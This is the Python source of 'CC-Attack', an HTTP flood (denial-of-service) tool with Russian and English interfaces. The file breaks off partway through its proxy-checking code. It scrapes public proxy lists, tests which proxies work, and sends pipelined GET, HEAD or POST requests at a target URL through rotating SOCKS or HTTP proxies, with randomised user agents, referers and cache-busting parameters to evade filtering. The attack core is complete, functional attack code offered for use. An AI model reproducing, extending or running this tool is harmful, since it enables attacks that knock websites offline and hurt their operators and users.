#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
CC-Attack v3.9.6 — refactored + i18n (RU/EN) + fast proxy checker + RPS boost
Author: DIDO
Requires: pip install requests pysocks
"""
import argparse
import concurrent.futures as cf
import datetime
import logging
import os
import platform
import random
import re
import signal
import socket
import ssl
import sys
import threading
import time
from pathlib import Path

import requests
import socks

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI / цветовая палитра
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    ORG   = "\033[38;5;208m"
    YEL   = "\033[93m"
    GRN   = "\033[92m"
    CYN   = "\033[96m"
    BLU   = "\033[94m"
    PRP   = "\033[95m"
    WHT   = "\033[97m"

VERSION = "3.9.6"
BUILD   = "2026/09/24"

# ── Параметры RPS-буста ─────────────────────────────────────────────────────
PIPELINE_DEPTH        = 8
KEEPALIVE_PER_SOCKET  = 500
SOCKET_SNDBUF         = 262144
SOCKET_RCVBUF         = 262144
CONNECT_TIMEOUT       = 2.5
SEND_TIMEOUT          = 2.0
ERROR_BACKOFF         = 0.002

# ── Регулярка для валидного прокси: IPv4/IPv6:port ──────────────────────────
# Ловит обе формы: "1.2.3.4:8080" и "[2001:db8::1]:1080"
_PROXY_RE = re.compile(
    r"(?:\[(?P<ip6>[0-9a-fA-F:]+)\]|(?P<ip4>\d{1,3}(?:\.\d{1,3}){3}))"
    r":(?P<port>\d{1,5})"
)

# ─────────────────────────────────────────────────────────────────────────────
#  ЛОКАЛИЗАЦИЯ (RU / EN)
# ─────────────────────────────────────────────────────────────────────────────
LANG = "en"

TEXTS = {
    "ru": {
        "banner_attack":   "C C - A T T A C K",
        "banner_present":  "P R E S E N T E D   B Y",
        "banner_python":   "Python",
        "banner_cpu":      "CPU",
        "err_url_prefix":  "URL должен начинаться с http:// или https://",
        "err_no_url":      "Не задан -url. Завершение.",
        "err_no_proxy":    "Нет прокси. Используйте -down.",
        "err_no_alive":    "Не найдено рабочих прокси.",
        "err_data_read":   "Не читается -data: {e}",
        "info_target":     "Цель: {url}",
        "info_mode":       "Режим: {mode}  •  потоков: {threads}  •  прокси: {v}  •  pipeline: {p}",
        "info_download":   "Загрузка прокси: {n} источников ({kind})…",
        "ok_saved_proxy":  "Сохранено {n} уникальных прокси → {path}",
        "info_normalized": "Нормализовано: {n} прокси (отброшено: {bad})",
        "ok_proxy_count":  "Прокси в наличии: {n}",
        "info_checking":   "Проверка {n} прокси (timeout={ms}s, workers={w}, fast={fast})…",
        "check_progress":  "  > проверено {done}/{total} ({pct:5.1f}%)  живых: {alive:<5}  скорость: {rps:5.0f}/с  ETA: {eta:>4}s   ",
        "check_autosave":  "Автосохранение: {n} живых → {path}",
        "ok_alive":        "Рабочих прокси: {n} из {total} ({pct:.1f}%)",
        "ok_top":          "Топ-{n} самых быстрых:",
        "ok_top_line":     "  {rank:>2}. {proxy:<24} {ms:>4} мс",
        "info_start":      "Запуск потоков…",
        "warn_shutdown":   "Завершение по Ctrl+C…",
        "warn_force":      "Повторный сигнал — жёсткий выход.",
        "warn_interrupt":  "Прервано пользователем.",
        "warn_bad_proxy":  "Пропущен битый прокси: {p}",
        "ok_done":         "Готово. Отправлено: {sent}, ошибок: {err}, трафик: {mb:.2f} МБ, средний RPS: {rps:.0f}",
        "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}отправлено:{rst} {sent:<9} | {red}ошибок:{rst} {err:<7} | {yel}МБ:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
        "help_title":      "справка",
        "help_url":        "цель (обязательно)",
        "help_mode":       "режим (по умолчанию cc)",
        "help_proxy":      "тип прокси (по умолчанию 5)",
        "help_threads":    "потоков (по умолчанию 800)",
        "help_period":     "длительность атаки (60)",
        "help_brute":      "TCP_NODELAY brute (0)",
        "help_file":       "файл прокси (proxy.txt)",
        "help_data":       "POST-тело (только для -m post)",
        "help_cookies":    "Cookie-строка",
        "help_down":       "скачать прокси",
        "help_check":      "проверить прокси (быстрая проверка)",
        "help_check_to":   "таймаут проверки прокси в секундах (3)",
        "help_check_w":    "воркеров проверки прокси (500)",
        "help_pipeline":   "глубина pipeline 1..64 (8)",
        "help_keepalive":  "запросов на сокет 1..10000 (500)",
        "help_log":        "дублировать вывод в файл",
        "help_lang":       "язык интерфейса: ru | en",
        "help_help":       "эта справка",
        "lang_select":     "Выберите язык / Select language:",
        "lang_prompt":     "Ваш выбор (ru/en) [ru]: ",
        "lang_invalid":    "Неверный выбор. Введите ru или en.",
    },
    "en": {
        "banner_attack":   "C C - A T T A C K",
        "banner_present":  "P R E S E N T E D   B Y",
        "banner_python":   "Python",
        "banner_cpu":      "CPU",
        "err_url_prefix":  "URL must start with http:// or https://",
        "err_no_url":      "No -url specified. Exiting.",
        "err_no_proxy":    "No proxies. Use -down.",
        "err_no_alive":    "No working proxies found.",
        "err_data_read":   "Cannot read -data: {e}",
        "info_target":     "Target: {url}",
        "info_mode":       "Mode: {mode}  •  threads: {threads}  •  proxy: {v}  •  pipeline: {p}",
        "info_download":   "Downloading proxies: {n} sources ({kind})…",
        "ok_saved_proxy":  "Saved {n} unique proxies → {path}",
        "info_normalized": "Normalized: {n} proxies (discarded: {bad})",
        "ok_proxy_count":  "Proxies available: {n}",
        "info_checking":   "Checking {n} proxies (timeout={ms}s, workers={w}, fast={fast})…",
        "check_progress":  "  > checked {done}/{total} ({pct:5.1f}%)  alive: {alive:<5}  speed: {rps:5.0f}/s  ETA: {eta:>4}s   ",
        "check_autosave":  "Autosave: {n} alive → {path}",
        "ok_alive":        "Working proxies: {n} of {total} ({pct:.1f}%)",
        "ok_top":          "Top-{n} fastest:",
        "ok_top_line":     "  {rank:>2}. {proxy:<24} {ms:>4} ms",
        "info_start":      "Starting threads…",
        "warn_shutdown":   "Shutdown by Ctrl+C…",
        "warn_force":      "Second signal — hard exit.",
        "warn_interrupt":  "Interrupted by user.",
        "warn_bad_proxy":  "Skipped bad proxy: {p}",
        "ok_done":         "Done. Sent: {sent}, errors: {err}, traffic: {mb:.2f} MB, avg RPS: {rps:.0f}",
        "progress":        "  {grn}▶{rst} {el:>3}/{tot}s  | {cyn}sent:{rst} {sent:<9} | {red}errs:{rst} {err:<7} | {yel}MB:{rst} {mb:>6.2f} | {prp}RPS:{rst} {rps:>7.0f}",
        "help_title":      "help",
        "help_url":        "target URL (required)",
        "help_mode":       "attack mode (default cc)",
        "help_proxy":      "proxy type (default 5)",
        "help_threads":    "threads (default 800)",
        "help_period":     "attack duration in seconds (60)",
        "help_brute":      "TCP_NODELAY brute (0)",
        "help_file":       "proxy file (proxy.txt)",
        "help_data":       "POST body (only for -m post)",
        "help_cookies":    "Cookie string",
        "help_down":       "download proxies",
        "help_check":      "check proxies (fast mode)",
        "help_check_to":   "checker timeout in seconds (3)",
        "help_check_w":    "checker workers (500)",
        "help_pipeline":   "pipeline depth 1..64 (8)",
        "help_keepalive":  "requests per socket 1..10000 (500)",
        "help_log":        "duplicate output to file",
        "help_lang":       "interface language: ru | en",
        "help_help":       "this help",
        "lang_select":     "Выберите язык / Select language:",
        "lang_prompt":     "Your choice (ru/en) [en]: ",
        "lang_invalid":    "Invalid choice. Enter ru or en.",
    },
}


def t(_k: str, **kw) -> str:
    s = TEXTS.get(LANG, TEXTS["en"]).get(_k, _k)
    return s.format(**kw) if kw else s


def detect_lang_from_env() -> str | None:
    for var in ("LANGUAGE", "LC_ALL", "LC_MESSAGES", "LANG"):
        val = os.environ.get(var, "")
        if not val:
            continue
        low = val.lower()
        if low.startswith("ru") or "ru_" in low or low == "ru":
            return "ru"
        if low.startswith("en") or "en_" in low or low == "en":
            return "en"
    return None


def select_language(forced: str | None = None) -> str:
    global LANG
    if forced in ("ru", "en"):
        LANG = forced
        return LANG
    env = detect_lang_from_env()
    if env:
        LANG = env
        return LANG
    if not sys.stdin.isatty():
        LANG = "en"
        return LANG

    print(f"\n{C.BOLD}{C.YEL}╭──────────────────────────────────────╮{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}  {C.WHT}Выберите язык / Select language{C.RESET}   {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}                                     {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}    {C.GRN}[1]{C.RESET} Русский                       {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}│{C.RESET}    {C.CYN}[2]{C.RESET} English                       {C.YEL}│{C.RESET}")
    print(f"{C.BOLD}{C.YEL}╰──────────────────────────────────────╯{C.RESET}")

    while True:
        try:
            choice = input(f"{C.CYN}>{C.RESET} {TEXTS['ru']['lang_prompt']}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            LANG = "en"
            return LANG
        if choice in ("", "1", "ru", "r", "рус", "русский"):
            LANG = "ru"
            return LANG
        if choice in ("2", "en", "e", "eng", "english"):
            LANG = "en"
            return LANG
        print(f"{C.RED}{TEXTS['en']['lang_invalid']}{C.RESET}")

# ─────────────────────────────────────────────────────────────────────────────
#  Красивый баннер
# ─────────────────────────────────────────────────────────────────────────────
DIDO_ART = r"""
   ██████╗ ██╗██████╗  ██████╗
   ██╔══██╗██║██╔══██╗██╔═══██╗
   ██║  ██║██║██║  ██║██║   ██║
   ██║  ██║██║██║  ██║██║   ██║
   ██████╔╝██║██████╔╝╚██████╔╝
   ╚═════╝ ╚═╝╚═════╝  ╚═════╝
"""

CC_ART = r"""
    ██████╗ ██████╗
   ██╔════╝██╔════╝
   ██║     ██║
   ██║     ██║
   ╚██████╗╚██████╗
    ╚═════╝ ╚═════╝
"""

def print_banner() -> None:
    line_top = f"{C.RED}╔{'═' * 62}╗{C.RESET}"
    line_bot = f"{C.RED}╚{'═' * 62}╝{C.RESET}"
    line_mid = f"{C.RED}╠{'═' * 62}╣{C.RESET}"

    def row(text: str, color: str = C.WHT, pad: int = 62) -> str:
        vis = len(text)
        left  = (pad - vis) // 2
        right = pad - vis - left
        return (f"{C.RED}║{C.RESET}"
                f"{' ' * left}{color}{text}{C.RESET}{' ' * right}"
                f"{C.RED}║{C.RESET}")

    print()
    print(line_top)
    print(row(t("banner_attack"), C.YEL))
    print(row(f"v{VERSION}  •  {BUILD}", C.CYN))
    print(line_mid)

    for art_line in DIDO_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row(t("banner_present"), C.DIM))
    for art_line in CC_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row(f"{t('banner_python')} {platform.python_version()}  |  "
              f"{platform.system()} {platform.release()}", C.GRN))
    print(row(f"{t('banner_cpu')}: {platform.machine()}  |  PID: {os.getpid()}",
              C.GRN))
    print(line_bot)
    print()

# ─────────────────────────────────────────────────────────────────────────────
#  Источники прокси
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PROXY_SOURCES = {
    "socks4": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://openproxylist.xyz/socks4.txt",
        "https://proxyspace.pro/socks4.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
    ],
    "socks5": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
        "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
        "https://openproxylist.xyz/socks5.txt",
        "https://proxyspace.pro/socks5.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
    ],
    "http": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&simplified=true",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
        "https://openproxylist.xyz/http.txt",
        "https://proxyspace.pro/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
#  Логгер
# ─────────────────────────────────────────────────────────────────────────────
class Log:
    _lock = threading.Lock()

    @staticmethod
    def _emit(prefix: str, color: str, msg: str) -> None:
        with Log._lock:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(
                f"{C.DIM}[{ts}]{C.RESET} {color}{prefix}{C.RESET} {msg}\n"
            )
            sys.stdout.flush()

    @staticmethod
    def info(m): Log._emit("[*]", C.CYN, m)
    @staticmethod
    def ok(m):   Log._emit("[+]", C.GRN, m)
    @staticmethod
    def warn(m): Log._emit("[!]", C.YEL, m)
    @staticmethod
    def err(m):  Log._emit("[-]", C.RED, m)

# ─────────────────────────────────────────────────────────────────────────────
#  UA / Accept / Referer
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_VERSIONS = [f"{v}.0.0.0" for v in range(120, 137)]
_FIREFOX_VERSIONS = [f"{v}.0" for v in range(120, 135)]
_OS_WINDOWS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; WOW64",
    "Windows NT 10.0",
    "Windows NT 6.3; Win64; x64",
    "Windows NT 6.1; Win64; x64",
]
_OS_MAC = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 11_7_10",
    "Macintosh; Intel Mac OS X 12_7_6",
    "Macintosh; Intel Mac OS X 13_6_6",
    "Macintosh; Intel Mac OS X 14_6_1",
]
_OS_LINUX = ["X11; Linux x86_64", "X11; Linux i686", "X11; Ubuntu; Linux x86_64"]

ACCEPT_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: application/json, text/plain, */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
    "Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.google.ru/search?q=",
    "https://yandex.ru/search/?text=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.youtube.com/results?search_query=",
    "https://vk.com/search?c[q]=",
    "https://ok.ru/search?st.query=",
    "https://steamcommunity.com/market/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/?q=",
    "https://check-host.net/",
    "https://github.com/search?q=",
    "https://stackoverflow.com/search?q=",
    "https://www.reddit.com/search/?q=",
]

_UA_CACHE: list[str] = []
_UA_CACHE_LOCK = threading.Lock()

def get_ua() -> str:
    if not _UA_CACHE:
        with _UA_CACHE_LOCK:
            if not _UA_CACHE:
                for _ in range(512):
                    plat = random.choice(("win", "mac", "lin"))
                    if plat == "win":
                        os_str = random.choice(_OS_WINDOWS)
                    elif plat == "mac":
                        os_str = random.choice(_OS_MAC)
                    else:
                        os_str = random.choice(_OS_LINUX)
                    if random.random() < 0.7:
                        wv = random.randint(537, 605)
                        cv = random.choice(_CHROME_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}) AppleWebKit/{wv}.36 "
                            f"(KHTML, like Gecko) Chrome/{cv} Safari/{wv}.36"
                        )
                    else:
                        fv = random.choice(_FIREFOX_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}; rv:{fv}) "
                            f"Gecko/20100101 Firefox/{fv}"
                        )
    return random.choice(_UA_CACHE)

# ─────────────────────────────────────────────────────────────────────────────
#  Ядро атаки (RPS BOOST)
# ─────────────────────────────────────────────────────────────────────────────
class CCHandler:
    """
    Высокопроизводительный обработчик CC-атаки.

    Оптимизации RPS:
      * pipeline_depth — пачка HTTP-запросов в одном sendall
      * keepalive_per_socket — много запросов на один сокет
      * TCP_NODELAY + SO_SNDBUF/SO_RCVBUF + TCP_FASTOPEN
      * round-robin по прокси
      * ленивый пул предвычисленных заголовков
    """

    def __init__(self, target: str, path: str, port: int, protocol: str,
                 proxies: list[str], proxy_type: int, cookies: str,
                 post_data: str, brute: bool, stop_event: threading.Event,
                 header_refresh: int = 32,
                 pipeline_depth: int = PIPELINE_DEPTH,
                 keepalive_per_socket: int = KEEPALIVE_PER_SOCKET,
                 header_pool_size: int = 2000):
        # ── 1. СНАЧАЛА все локи ──────────────────────────────────────
        self._rr_lock  = threading.Lock()
        self._hdr_lock = threading.Lock()
        self._slock    = threading.Lock()

        # ── 2. Основные параметры ────────────────────────────────────
        self.target   = target
        self.path     = path
        self.port     = port
        self.protocol = protocol
        self.proxies  = proxies
        self.proxy_type = proxy_type
        self.cookies  = cookies
        self.post_data = post_data
        self.brute    = brute
        self.stop     = stop_event
        self.header_refresh = header_refresh
        self.pipeline_depth = max(1, min(64, pipeline_depth))
        self.keepalive_per_socket = max(1, min(10000, keepalive_per_socket))
        self.header_pool_size = max(200, min(20000, header_pool_size))

        # ── 3. round-robin ───────────────────────────────────────────
        self._rr = random.randint(0, max(0, len(proxies) - 1))

        # ── 4. Пул заголовков — ленивый ─────────────────────────────
        self._hdr_pool: list[str] = []
        self._hdr_pool_ready = False

        # ── 5. Статистика ────────────────────────────────────────────
        self.stats = {"sent": 0, "errors": 0, "bytes": 0}

        # ── 6. Хелперы ───────────────────────────────────────────────
        self._sep = "&" if "?" in self.path else "?"
        self._host_line = f"Host: {self.target}\r\n"

    # ── статистика ──────────────────────────────────────────────────
    def _stat(self, sent: int = 0, err: int = 0, nbytes: int = 0) -> None:
        with self._slock:
            self.stats["sent"] += sent
            self.stats["errors"] += err
            self.stats["bytes"] += nbytes

    # ── ленивый префетч заголовков ─────────────────────────────────
    def _ensure_headers(self) -> None:
        if self._hdr_pool_ready:
            return
        with self._hdr_lock:
            if self._hdr_pool_ready:
                return
            n = self.header_pool_size
            self._hdr_pool = [self._build_header("get") for _ in range(n)]
            self._hdr_pool_ready = True

    def _rand_header(self) -> str:
        return self._hdr_pool[random.randrange(len(self._hdr_pool))]

    # ── БЕЗОПАСНЫЙ выбор прокси (fix ValueError) ──────────────────
    def _pick_proxy(self) -> tuple[str, int]:
        """Возвращает (host, port), пропуская битые записи."""
        n = len(self.proxies)
        for _ in range(min(20, n)):
            with self._rr_lock:
                self._rr = (self._rr + 1) % n
                p = self.proxies[self._rr].strip()
            host, sep, port_s = p.rpartition(":")
            if not sep:
                continue
            try:
                port = int(port_s)
            except ValueError:
                continue
            # Дополнительная валидация host — не должен содержать ":" или нецифр
            if not host or ":" in host.replace("::", ""):
                pass  # IPv6 с :: — допустимо, но проверим ниже
            # Базовая проверка: host не пустой и не содержит пробелов
            if not host or " " in host:
                continue
            if not (0 < port < 65536):
                continue
            return host, port
        # Если все битые — вернуть первый и хост/порт "по нулям",
        # чтобы воркер упал в except и не зациклился
        raise ValueError("no valid proxy in list")

    # ── построение заголовков ──────────────────────────────────────
    def _build_header(self, method: str) -> str:
        if method in ("get", "head"):
            conn = "Connection: Keep-Alive\r\n"
            if self.cookies:
                conn += f"Cookie: {self.cookies}\r\n"
            ref  = f"Referer: {random.choice(REFERERS)}{self.target}{self.path}\r\n"
            ua   = f"User-Agent: {get_ua()}\r\n"
            acc  = random.choice(ACCEPT_HEADERS)
            return ref + ua + acc + conn + "\r\n"

        body = self.post_data or os.urandom(16).hex()
        lines = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"{random.choice(ACCEPT_HEADERS)}"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"Referer: http://{self.target}{self.path}\r\n"
            f"User-Agent: {get_ua()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: Keep-Alive\r\n"
        )
        if self.cookies:
            lines += f"Cookie: {self.cookies}\r\n"
        return lines + "\r\n" + body + "\r\n\r\n"

    # ── открытие сокета с RPS-твиками ─────────────────────────────
    def _open(self, host: str, port: int) -> socket.socket:
        s = socks.socksocket()
        if self.proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, port)
        elif self.proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, port)
        else:
            s.set_proxy(socks.HTTP, host, port)

        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError:
            pass
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_SNDBUF)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_RCVBUF)
        except OSError:
            pass
        if hasattr(socket, "TCP_FASTOPEN"):
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5)
            except OSError:
                pass

        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.target, self.port))
        if self.protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.target)
        try:
            s.settimeout(SEND_TIMEOUT)
        except OSError:
            pass
        return s

    # ── единый билдер пачки запросов ──────────────────────────────
    def _build_batch(self, mode: str, n: int) -> bytes:
        parts: list[str] = []
        if mode == "cc":
            for _ in range(n):
                hdr = self._rand_header()
                parts.append(
                    f"GET {self.path}{self._sep}"
                    f"{random.randint(0, 271400281257)} "
                    f"HTTP/1.1\r\n{self._host_line}{hdr}"
                )
        elif mode == "head":
            for _ in range(n):
                hdr = self._rand_header()
                parts.append(
                    f"HEAD {self.path}{self._sep}"
                    f"{random.randint(0, 271400281257)} "
                    f"HTTP/1.1\r\n{self._host_line}{hdr}"
                )
        else:  # post
            for _ in range(n):
                parts.append(self._build_header("post"))
        return "".join(parts).encode("utf-8", "ignore")

    # ── основной воркер ───────────────────────────────────────────
    def run(self, mode: str) -> None:
        self._ensure_headers()

        depth = self.pipeline_depth
        keepalive = self.keepalive_per_socket
        stop = self.stop
        builder = self._build_batch

        while not stop.is_set():
            try:
                host, port = self._pick_proxy()
            except ValueError:
                time.sleep(ERROR_BACKOFF * 10)
                continue

            s = None
            try:
                s = self._open(host, port)
                sent_on_socket = 0
                while sent_on_socket < keepalive and not stop.is_set():
                    batch = builder(mode, depth)
                    try:
                        s.sendall(batch)
                    except (socket.timeout, BrokenPipeError,
                            ConnectionResetError, OSError):
                        break
                    sent_on_socket += depth
                    self._stat(sent=depth, nbytes=len(batch))
                try:
                    s.close()
                except Exception:
                    pass
            except Exception:
                self._stat(err=1)
                if s is not None:
                    try: s.close()
                    except Exception: pass
                if ERROR_BACKOFF > 0:
                    time.sleep(ERROR_BACKOFF)

# ─────────────────────────────────────────────────────────────────────────────
#  Прокси — загрузка / нормализация
# ─────────────────────────────────────────────────────────────────────────────
def _is_valid_proxy(host: str, port: int) -> bool:
    """Проверяет, что host — валидный IPv4/IPv6, а port — в диапазоне."""
    if not (0 < port < 65536):
        return False
    h = host.strip("[]")
    try:
        socket.inet_pton(socket.AF_INET, h)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, h)
        return True
    except OSError:
        return False


def download_proxies(proxy_ver: str, out_file: Path) -> None:
    src_key = {"4": "socks4", "5": "socks5", "http": "http"}.get(proxy_ver, "socks5")
    urls = BUILTIN_PROXY_SOURCES[src_key]
    Log.info(t("info_download", n=len(urls), kind=src_key))
    seen: set[str] = set()
    total = 0
    with out_file.open("w", encoding="utf-8") as f:
        for api in urls:
            try:
                r = requests.get(api, timeout=8,
                                 headers={"User-Agent": get_ua()})
                if r.status_code != 200:
                    continue
                # Разбиваем по ЛЮБЫМ нецифровым разделителям кроме : и .
                for line in re.split(r"[\s,;|]+", r.text):
                    line = line.strip()
                    if not line:
                        continue
                    for m in _PROXY_RE.finditer(line):
                        host = m.group("ip4") or f"[{m.group('ip6')}]"
                        port = int(m.group("port"))
                        if not _is_valid_proxy(m.group("ip4") or m.group("ip6"), port):
                            continue
                        key = f"{host}:{port}"
                        if key in seen:
                            continue
                        seen.add(key)
                        f.write(key + "\n")
                        total += 1
            except Exception:
                continue
    Log.ok(t("ok_saved_proxy", n=total, path=out_file))


def normalize_proxy_file(path: Path) -> None:
    """
    Читает файл, извлекает ВСЕ валидные 'ip:port' через регулярку,
    дедуплицирует и перезаписывает.

    Это лечит баг со склейкой строк ('...80' + '117.54.114.97:80').
    """
    if not path.exists():
        return
    raw_text = path.read_text(encoding="utf-8", errors="ignore")

    # Разбиваем на "токены" по всем недопустимым разделителям,
    # затем в каждом токене ищем валидные ip:port через regex.
    seen: set[str] = set()
    keep: list[str] = []
    bad = 0

    for tok in re.split(r"[\s,;|\"'<>]+", raw_text):
        if not tok:
            continue
        matched = False
        for m in _PROXY_RE.finditer(tok):
            matched = True
            ip = m.group("ip4") or m.group("ip6")
            port = int(m.group("port"))
            if not _is_valid_proxy(ip, port):
                bad += 1
                continue
            key = f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"
            if key in seen:
                continue
            seen.add(key)
            keep.append(key)
        if not matched and (":" in tok):
            bad += 1

    path.write_text("\n".join(keep) + ("\n" if keep else ""), encoding="utf-8")
    Log.info(t("info_normalized", n=len(keep), bad=bad))

# ─────────────────────────────────────────────────────────────────────────────
#  ⚡ Быстрый чекер прокси
# ─────────────────────────────────────────────────────────────────────────────
_CHECK_TARGETS = [
    ("1.1.1.1", 80, b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"),
    ("8.8.8.8", 53, b""),
]


def _check_one_fast(line: str, proxy_type: int, ms: int
                    ) -> tuple[str, int] | None:
    host, _, port = line.rpartition(":")
    if not host or not port:
        return None
    try:
        port_i = int(port)
    except ValueError:
        return None
    if not _is_valid_proxy(host.strip("[]"), port_i):
        return None

    pt = 4 if proxy_type == 4 else (5 if proxy_type == 5 else 0)
    t0 = time.perf_counter()

    for i, (thost, tport, probe) in enumerate(_CHECK_TARGETS):
        s = None
        try:
            s = socks.socksocket()
            if pt == 4:
                s.set_proxy(socks.SOCKS4, host.strip("[]"), port_i)
            elif pt == 5:
                s.set_proxy(socks.SOCKS5, host.strip("[]"), port_i)
            else:
                s.set_proxy(socks.HTTP, host.strip("[]"), port_i)
            s.settimeout(ms if i == 0 else ms + 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((thost, tport))

            if probe:
                s.sendall(probe)
                data = s.recv(64)
                if not data:
                    raise OSError("empty response")

            s.close()
            return (line, int((time.perf_counter() - t0) * 1000))
        except Exception:
            if s is not None:
                try: s.close()
                except Exception: pass
            continue

    return None


def check_proxies(proxies: list[str], proxy_type: int, ms: int = 3,
                  workers: int = 500,
                  autosave_path: Path | None = None,
                  autosave_every: int = 5) -> list[str]:
    Log.info(t("info_checking", n=len(proxies), ms=ms, w=workers, fast="yes"))

    alive: list[tuple[str, int]] = []
    done = 0
    total = len(proxies)
    lock = threading.Lock()
    start = time.time()
    last_save = start

    stop_progress = threading.Event()

    def _progress_reporter():
        while not stop_progress.is_set():
            time.sleep(1)
            with lock:
                d, a = done, len(alive)
            elapsed = time.time() - start
            rps = d / elapsed if elapsed > 0 else 0
            eta = (total - d) / rps if rps > 0 else 0
            pct = (d / total * 100) if total else 100.0
            try:
                sys.stdout.write("\r" + t(
                    "check_progress",
                    done=d, total=total, pct=pct,
